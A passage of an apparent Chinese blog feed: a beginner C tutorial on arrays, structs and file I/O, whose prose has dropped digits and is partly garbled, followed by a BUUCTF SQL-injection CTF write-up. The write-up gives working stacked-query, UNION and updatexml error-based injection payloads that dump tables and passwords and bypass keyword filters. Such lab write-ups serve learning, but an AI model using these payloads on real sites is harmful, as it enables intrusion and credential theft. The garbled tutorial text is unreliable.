<p>例如，下面的描述定义了两个数组：<br>　　int a[ 0];<br>　　double a [ 00];<br>　　定义了一个包含有 0个元素的整型数组a和一个 00个元素的双精度数组a 。数组元素个数也称为数组的大小或数组的长度。数组定义可以与其他变量的定义写在一起，例如可以写：<br>　　int a [ ], n, a [ ], m;<br>　　数组变量也是变量，数组定义可以出现在任何能定义简单变量的地方。数组变量也是变量，在作用域和存在期方面与简单变量没有差别。根据定义位置不同，数组也分为外部数组和函数内的局部数组，包括函数内的静态数组（用关键字static）和普通的自动数组，定义方式（及位置）决定了它们的作用域与存在期。<br>　　可以写出数组的外部说明。C语言规定，在写数组变量的外部说明时不必写数组大小，只要在数组变量名后写一对方括号。例如下面是两个数组的外部说明：<br>　　extern int a[];<br>　　extern double a [];<br>　　这两个说明通知本源文件的其他部分，有两个数组（a和a ）在其他地方定义，它们的元素类型分别是整型和双精度类型。数组元素个数必须能在编译时静态确定，因此这个表达式必须能静态求值，最简单的情况就是写一个整型字面量（整数）。根据这个规定，下面数组定义不合法<br>　　void f(int m, int n) {<br>　　int b[n];<br>　　….<br>　　}<br>　　此时局部数组b的大小依赖于函数的参数值，这个值在编译时无法确定。<br>　　<strong>3、数组的使用</strong><br>　　使用数组的最基本操作是元素访问，对数组的使用最终都通过对元素的使用而实现。数组元素在数组里顺序排列编号，首元素的编号规定为0，其他元素顺序编号。这样，n个元素的数组的元素编号范围是0到n-1 。如果程序里定义了数组：<br>　　int b[ ];<br>　　b的元素将依次编号为0、 、 、 。数组元素的编号也称为元素的下标或指标。<br>　　数组元素访问通过数组名和表示下标的表达式进行，用下标运算符[]描述。下标运算符[]是C语言里优先级最高的运算符之一，它的两个运算对象的书写形式比较特殊：一个运算对象写在方括号前面，应表示一个数组（简单情况是数组名）；另一个应该是整型表达式，写在括号里面表示元素下标。元素访问是一种基本表达式，写在表达式里的b[ ]就是一个下标表达式，表示访问数组b中编号为 的元素，即上面定义的数组b的最后元素</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	 <span class="keyword">int</span> a[<span class="number">2</span>][<span class="number">3</span>]=&#123;&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,</span><br><span class="line">				&#123;<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;&#125;;</span><br><span class="line">	 <span class="keyword">int</span> b[<span class="number">3</span>][<span class="number">2</span>],i,j;</span><br><span class="line">	 <span class="built_in">printf</span>(<span class="string">"array a:\n"</span>);</span><br><span class="line">	 <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">1</span>;i++)  <span class="comment">//处理a数组中的一行中各元素</span></span><br><span class="line">	 &#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;=<span class="number">2</span>;j++)<span class="comment">//处理a数组中的某一列元素</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"%5d"</span>,a[i][j]); <span class="comment">//输出a数组各元素</span></span><br><span class="line">			b[j][i]=a[i][j];       <span class="comment">//将a数组元素的值赋值给b数组相应元素</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span> (<span class="string">"\n"</span>);</span><br><span class="line">	 &#125;</span><br><span class="line">	 <span class="built_in">printf</span> (<span class="string">"array b:\n"</span>);      <span class="comment">//输出b数组各元素</span></span><br><span class="line">	 <span class="keyword">for</span>(<span class="keyword">int</span> n=<span class="number">0</span>; n&lt;=<span class="number">2</span>; n++)</span><br><span class="line">	 &#123;	</span><br><span class="line">		 <span class="keyword">for</span>(<span class="keyword">int</span> m=<span class="number">0</span>;m&lt;=<span class="number">1</span>;m++)</span><br><span class="line">			 <span class="built_in">printf</span>(<span class="string">"%5d"</span>,b[n][m]);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">	 &#125;</span><br><span class="line">	 <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/22/qIYZpFL3SNxt5j7.png" alt="image-20210522105044266"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j,row=<span class="number">0</span>,column=<span class="number">0</span>,<span class="built_in">max</span>;</span><br><span class="line">	<span class="keyword">int</span> a[<span class="number">3</span>][<span class="number">4</span>]=&#123;&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;,&#123;<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">6</span>&#125;,&#123;<span class="number">-10</span>,<span class="number">10</span>,<span class="number">-5</span>,<span class="number">2</span>&#125;&#125;; <span class="comment">//定义数组并赋初值</span></span><br><span class="line">	 <span class="built_in">max</span>=a[<span class="number">0</span>][<span class="number">0</span>];       </span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">2</span>;i++)</span><br><span class="line">	&#123;	 </span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;=<span class="number">3</span>;j++)</span><br><span class="line">			<span class="keyword">if</span>(a[i][j]&gt;<span class="built_in">max</span>)</span><br><span class="line">			&#123;	</span><br><span class="line">				<span class="built_in">max</span>=a[i][j];</span><br><span class="line">				row=i;</span><br><span class="line">				column=j;</span><br><span class="line">			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	 </span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">" max=%d\n row=%d\n column=%d\n"</span>,<span class="built_in">max</span>,row,column);</span><br><span class="line">	 <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/22/IyU7upNCPTe9hFz.png" alt="image-20210522105856972"></p>
<h1 id="用户自己建立数据类型"><a href="#用户自己建立数据类型" class="headerlink" title="用户自己建立数据类型"></a>用户自己建立数据类型</h1><blockquote>
<p>　<strong>结构(struct)</strong><br>　　结构是由基本数据类型构成的、并用一个标识符来命名的各种变量的组合。<br>　　结构中可以使用不同的数据类型。<br>　　<strong>1.结构说明和结构变量定义</strong><br>　　在Turbo C中,结构也是一种数据类型,可以使用结构变量,因此,象其它类型的变量一样,在使用结构变量时要先对其定义。<br>　　定义结构变量的一般格式为:<br>　　struct 结构名<br>　　{<br>　　类型 变量名;<br>　　类型 变量名;<br>　　…<br>　　} 结构变量;<br>　　结构名是结构的标识符不是变量名。类型为第二节中所讲述的五种数据类型(整型、浮点型、字符型、指针型和无值型)。构成结构的每一个类型变量称为结构成员,它象数组的元素一样,但数组中元素是以下标来访问的,而结构是按变量名字来访问成员的。<br>　　下面举一个例子来说明怎样定义结构变量。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">struct string</span><br><span class="line">&#123;</span><br><span class="line">char name[8];</span><br><span class="line">int age;</span><br><span class="line">char sex[2];</span><br><span class="line">char depart[20];</span><br><span class="line">float wage1, wage2, wage3, wage4, wage5;</span><br><span class="line">&#125; person;</span><br></pre></td></tr></table></figure></div>

<p>　　这个例子定义了一个结构名为string的结构变量person, 如果省略变量person, 则变成对结构的说明。用已说明的结构名也可定义结构变量。这样定义时上例变成:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">struct string</span><br><span class="line">&#123;</span><br><span class="line">char name[8];</span><br><span class="line">int age;</span><br><span class="line">char sex[2];</span><br><span class="line">char depart[20];</span><br><span class="line">float wage1, wage2, wage3, wage4, wage5;</span><br><span class="line">&#125;;</span><br><span class="line">struct string person;</span><br></pre></td></tr></table></figure></div>

<p>　　如果需要定义多个具有相同形式的结构变量时用这种方法比较方便, 它先作结构说明, 再用结构名来定义变量。<br>　　例如:<br>　　struct string Tianyr, Liuqi, …;<br>　　如果省略结构名, 则称之为无名结构, 这种情况常常出现在函数内部, 用这种结构时前面的例子变成:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">struct</span><br><span class="line">&#123;</span><br><span class="line">char name[8];</span><br><span class="line">int age;</span><br><span class="line">char sex[2];</span><br><span class="line">char depart[20];</span><br><span class="line">float wage1, wage2, wage3, wage4, wage5;</span><br><span class="line">&#125; Tianyr, Liuqi;</span><br></pre></td></tr></table></figure></div>

<p>　　<strong>2.结构变量的使用</strong><br>　　结构是一个新的数据类型, 因此结构变量也可以象其它类型的变量一样赋值、运算,不同的是结构变量以成员作为基本变量。<br>　　结构成员的表示方式为:结构变量.成员名如果将”结构变量.成员名”看成一个整体, 则这个整体的数据类型与结构中该成员的数据类型相同, 这样就可象前面所讲的变量那样使用。</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"string.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">20</span>];        <span class="comment">//候选人姓名</span></span><br><span class="line">	<span class="keyword">int</span> count;            <span class="comment">//候选人得票数</span></span><br><span class="line">&#125;leader[<span class="number">3</span>]=&#123;<span class="string">"Li"</span>,<span class="number">0</span>,<span class="string">"Zhang"</span>,<span class="number">0</span>,<span class="string">"Sun"</span>,<span class="number">0</span>&#125;;<span class="comment">//定义结构体数组并初始化</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j;</span><br><span class="line">	<span class="keyword">char</span> leader_name[<span class="number">20</span>]; <span class="comment">//定义字符数组</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">10</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%s"</span>,leader_name); <span class="comment">//输入所选的候选人姓名</span></span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">3</span>;j++)</span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">strcmp</span>(leader_name,leader[j].name)==<span class="number">0</span>)</span><br><span class="line">				leader[j].count++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nResult:\n"</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%5s:%d\n"</span>,leader[i].name,leader[i].count);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/22/X6JNrPflWnDuYjy.png" alt="image-20210522111719997"></p>
<h1 id="文件的输入与输出"><a href="#文件的输入与输出" class="headerlink" title="文件的输入与输出"></a>文件的输入与输出</h1><blockquote>
<p>C语言是通过将一个文件类型指针与文件关联起来来对文件进行打开、关闭、输入、输出。<br>　　文件类型为FILE（实际上是一个结构体）。定义一个文件指针为FILE *fp；就可以将fp和某个文件关联起来进行操作了。例如要打开一个文件：<br>　　FILE *fp;fp=fopen(“filename”，“打开方式”)；//fopen的返回值为NULL或指向文件的指针或者直接FILE *fp=(“filename”,”打开方式”)；如果要重定向只需将指针fp和另一个文件关联。意思是可用一个文件指针操作多个文件。<br>　　文件使用完后要及时关闭。这是个好习惯。关闭函数为fclose(fp);这样fp就不在和之前指向的文件关联了。<br>　　1.判断文件是否打开成功： <a href="http://www.2cto.com" target="_blank" rel="noopener">www.2cto.com</a><br>　　判断文件是否打开成功可用fopen的返回值if((fp=fopen(“filename”,”r”))==NULL)则打开失败。<br>　　2.判断文件是否结束：<br>　　判断ASCII文件是否结束fgetc（）会返回结束标志EOF（即-1）由于二进制文件数据会出现-1所以必须用函数feof(fp)判断，feof(fp)==1则已结束。<br>　　3.单个字符的输入输出：fgetc（）和fputc（）<br>　　ch=fgetc(fp);fp为文件指针，且fgetc()不会忽略空格和回车符，只能用于读入字符。相应的fputc(ch,fp);向文件输出字符时也不会忽略空格，回车符因为fgetc()返回字符所以fgetc()和fputc()通常嵌套使用：fputc（fgetc（in），out）。<br>　　fputc()的返回值为输入的字符或EOF（-1）（失败的情况下）<br>　　fgetc（）的返回值为读入的字符（包括文件结束标志EOF(-1)）<br>　　4.数据块的输入输出：fread（buff,size,count,fp）和发fwrite(buffer,size,count,fp)buffer是一个指针，对于fread，它是读入数据的存放地址，对于发fwrite它是要输出数据的地址，size是指要读写的字节数，count是要进行读写多少个size字节的数据项。<br>　　如果成功fread和fwrite都返回成功输入和读取的数据块个数有可能比count小；<br>　　注意：fread参数buffer指向的空间必须大于或等于要读入的数据块大小。<br>　　fread和fwrite一般用于二进制文件的输入输出。用于ASCII文件字符发生转换的情况下可能出现与原设想的情况不同。<br>　　5.putw（）和getw()用来对磁盘文件读写一个整数。<br>　　例如putw（10，fp）；//返回值为输出的数字（int）<br>　　int i=getw（fp）；//失败则返回-1<br>　　但注意putw（）和getw（）都是按二进制输入输出的。<br>　　所以如果你用putw（）输入数据到文件后以文本的方式打开看到的将都是乱码。<br>　　同样如果你在文本文件中输入了数字并保存，用getw（）来读入的话读入的结果并不是你想象的那样。因为它是按二进制读的</p>
</blockquote>
<blockquote>
<table>
<thead>
<tr>
<th>r</th>
<th>打开一个已有的文本文件，允许读取文件。</th>
</tr>
</thead>
<tbody><tr>
<td>w</td>
<td>打开一个文本文件，允许写入文件。如果文件不存在，则会创建一个新文件。在这里，您的程序会从文件的开头写入内容。如果文件存在，则该会被截断为零长度，重新写入。</td>
</tr>
<tr>
<td>a</td>
<td>打开一个文本文件，以追加模式写入文件。如果文件不存在，则会创建一个新文件。在这里，您的程序会在已有的文件内容中追加内容。</td>
</tr>
<tr>
<td>r+</td>
<td>打开一个文本文件，允许读写文件。</td>
</tr>
<tr>
<td>w+</td>
<td>打开一个文本文件，允许读写文件。如果文件已存在，则文件会被截断为零长度，如果文件不存在，则会创建一个新文件。</td>
</tr>
<tr>
<td>a+</td>
<td>打开一个文本文件，允许读写文件。如果文件不存在，则会创建一个新文件。读取会从文件的开头开始，写入则只能是追加模式。</td>
</tr>
</tbody></table>
</blockquote>
<blockquote>
<p><strong>注意：</strong>请确保您有可用的 <strong>tmp</strong> 目录，如果不存在该目录，则需要在您的计算机上先创建该目录。</p>
<p><strong>/tmp</strong> 一般是 Linux 系统上的临时目录，如果你在 Windows 系统上运行，则需要修改为本地环境中已存在的目录，例如: <strong>C:\tmp</strong>、<strong>D:\tmp</strong>等。</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line">   </span><br><span class="line">   fp = fopen(<span class="string">"D:\\CC\\test.txt"</span>,<span class="string">"w+"</span>);</span><br><span class="line">   <span class="built_in">fprintf</span>(fp, <span class="string">"this is test fprinttf ……\n"</span>);</span><br><span class="line">   <span class="built_in">fputs</span>(<span class="string">"This is testing fputs……\n"</span>, fp);</span><br><span class="line">   fclose(fp);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/22/HVTaMmDk3Ud65f7.png" alt="image-20210522115234904"></p>
<blockquote>
<p>首先，<strong>fscanf()</strong> 方法只读取了 <strong>This</strong>，因为它在后边遇到了一个空格。其次，调用 <strong>fgets()</strong> 读取剩余的部分，直到行尾。最后，调用 <strong>fgets()</strong> 完整地读取第二行。</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line">   <span class="keyword">char</span> buff[<span class="number">500</span>];</span><br><span class="line"> </span><br><span class="line">   fp = fopen(<span class="string">"D:\\CC\\test.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">   <span class="built_in">fscanf</span>(fp, <span class="string">"%s"</span>, buff);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"1: %s\n"</span>, buff );</span><br><span class="line"> </span><br><span class="line">   fgets(buff, <span class="number">500</span>, (FILE*)fp);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"2: %s\n"</span>, buff );</span><br><span class="line">   </span><br><span class="line">   fgets(buff, <span class="number">500</span>, (FILE*)fp);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"3: %s\n"</span>, buff );</span><br><span class="line">   fclose(fp);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/22/Xkj3GKyhfNYbeBq.png" alt="image-20210522115752871"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	FILE * fp &#x3D; NULL;</span><br><span class="line">	char str[3][10],temp[10]; &#x2F;&#x2F;str是用来存放字符串的二维数组，temp是临时数组</span><br><span class="line">	int i,j,k,n&#x3D;3;</span><br><span class="line">	printf(&quot;Enter strings:\n&quot;);  &#x2F;&#x2F;提示输入字符串</span><br><span class="line">	for(i&#x3D;0;i&lt;n;i++)</span><br><span class="line">		gets(str[i]); &#x2F;&#x2F;输入字符串</span><br><span class="line">	for(i&#x3D;0;i&lt;n-1;i++)   &#x2F;&#x2F;用选择法对字符串排序</span><br><span class="line">	&#123;</span><br><span class="line">		k&#x3D;i;</span><br><span class="line">		for(j&#x3D;i+1;j&lt;n;j++)</span><br><span class="line">			if(strcmp(str[k],str[j])&gt;0)</span><br><span class="line">				k&#x3D;j;</span><br><span class="line">		if(k!&#x3D;i)</span><br><span class="line">		&#123;</span><br><span class="line">			strcpy(temp,str[i]);</span><br><span class="line">			strcpy(str[i],str[k]);</span><br><span class="line">			strcpy(str[k],temp);</span><br><span class="line">		&#125;</span><br><span class="line">	 fp&#x3D;fopen(&quot;D:\\CC\\test.txt&quot;,&quot;w&quot;);</span><br><span class="line">		printf(&quot;\nThe new sequence:\n&quot;);</span><br><span class="line">		for(i&#x3D;0;i&lt;n;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			fputs(str[i],fp);fputs(&quot;\n&quot;,fp); &#x2F;&#x2F;向磁盘文件写一个字符串，然后输出一个换行符</span><br><span class="line">			printf(&quot;%s\n&quot;,str[i]);       &#x2F;&#x2F;在屏幕上显示</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/22/RZ6tPE3udhq4bB5.png" alt="image-20210522120550875"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>因为之前学过类似语言，基础学习起来比较快。</p>
</blockquote>
]]></content>
      <categories>
        <category>C语言</category>
      </categories>
      <tags>
        <tag>C语言</tag>
        <tag>成长之路</tag>
      </tags>
  </entry>
  <entry>
    <title>[buuctf]web SQL注入篇</title>
    <url>/2021/05/19/%5Bbuuctf%5Dweb%20SQL%E6%B3%A8%E5%85%A5%E7%AF%87/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><hr>
<h1 id="简单说明"><a href="#简单说明" class="headerlink" title="简单说明"></a>简单说明</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">记录buuctf web中SQL注入学习   简单题目未写</span><br></pre></td></tr></table></figure></div>



<h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><p>1、万能密码注入</p>
<p><img src="https://i.loli.net/2021/05/18/xEHvRa1UesJMAZh.png" alt="image-20210518194946967"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">1&#39;;rename table words to words2; </span><br><span class="line">rename table &#96;1919810931114514&#96; to &#96;words&#96;;</span><br><span class="line"> alter table words change flag id varchar(100);</span><br><span class="line">  show tables; </span><br><span class="line">  show columns from words;#</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/18/h8DMFSX9lUPiEcT.png" alt="image-20210518200458235"></p>
<h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h1><p>1、万能密码注入 </p>
<blockquote>
<p>‘ or 1=1 #</p>
</blockquote>
<p><img src="https://i.loli.net/2021/05/18/auKdHVZUbBPzYjO.png" alt="image-20210518205129073"></p>
<p>2、找字段</p>
<blockquote>
<p>‘ order by 3 #</p>
</blockquote>
<blockquote>
<p>’ union select 1,2,3; #  找回显</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">2&#39; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() #</span><br></pre></td></tr></table></figure></div>

<p>3、爆表</p>
<p><img src="https://i.loli.net/2021/05/18/LyIcbRsn7Z8E5Wa.png" alt="image-20210518205534376"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">2&#39; union select 1,database(),group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;geekuser&#39; #</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/18/ObyQArLXgiFwNjc.png" alt="image-20210518205747038"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">2&#39; union select 1,database(),group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;l0ve1ysq1&#39; #</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">2&#39; union select 1,2,group_concat(id,username,password) from l0ve1ysq1 #</span><br><span class="line"></span><br><span class="line">2&#39; uunionnion sselectelect 1,2,group_concat(id,username,passwoordd) ffromrom l0ve1ysq1 #</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/18/1xIhzTnAyQBokmE.png" alt="image-20210518210415619"></p>
<h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><p>1、用hackbar进行构造传参测试</p>
<p><img src="https://i.loli.net/2021/05/19/kDm1vPCcjuZEKsa.png" alt="image-20210519193037797"></p>
<p>2、测试限制的传参</p>
<p><img src="https://i.loli.net/2021/05/19/fvqXaKy9bsFJcRu.png" alt="image-20210519193407564"></p>
<p><img src="https://i.loli.net/2021/05/19/fvqXaKy9bsFJcRu.png" alt=""></p>
<p><img src="https://i.loli.net/2021/05/19/zoRVL5PbWcvUFuE.png" alt="image-20210519193346862"></p>
<p><img src="https://i.loli.net/2021/05/19/Nc3C68ZhVH7Dmzg.png" alt="image-20210519193550883"></p>
<p>3、爆库、爆表</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;f232a01e-3c9d-480d-bd28-439ce083b5f6.node3.buuoj.cn&#x2F;check.php</span><br><span class="line">?username&#x3D;admin</span><br><span class="line">&amp;password&#x3D; admin&#39;or(updatexml(1,concat(0x7e,(select(database()))),1))%23</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/19/RoANXceS9qKsixB.png" alt="image-20210519193647543"></p>
<p>4、爆表</p>
<p><img src="https://i.loli.net/2021/05/19/Iexyc6Bk2hdrpQi.png" alt="image-20210519194502176"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;f232a01e-3c9d-480d-bd28-439ce083b5f6.node3.buuoj.cn&#x2F;check.php</span><br><span class="line">?username&#x3D;admin</span><br><span class="line">&amp;password&#x3D; admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database()))),1))%23</span><br></pre></td></tr></table></figure></div>

<p>5、爆字段</p>
<p><img src="https://i.loli.net/2021/05/19/yP6BVrEXRkQcbLC.png" alt="image-20210519194647159"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;f232a01e-3c9d-480d-bd28-439ce083b5f6.node3.buuoj.cn&#x2F;check.php</span><br><span class="line">?username&#x3D;admin</span><br><span class="line">&amp;password&#x3D; admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;))),1))%23</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/19/92Xso48euzthOF6.png" alt="image-20210519195854553"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;f232a01e-3c9d-480d-bd28-439ce083b5f6.node3.buuoj.cn&#x2F;check.php</span><br><span class="line">?username&#x3D;admin</span><br><span class="line">&amp;password&#x3D; admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1))),1))%23</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/19/p9o1zSfg4OayNn3.png" alt="image-20210519200015966"></p>
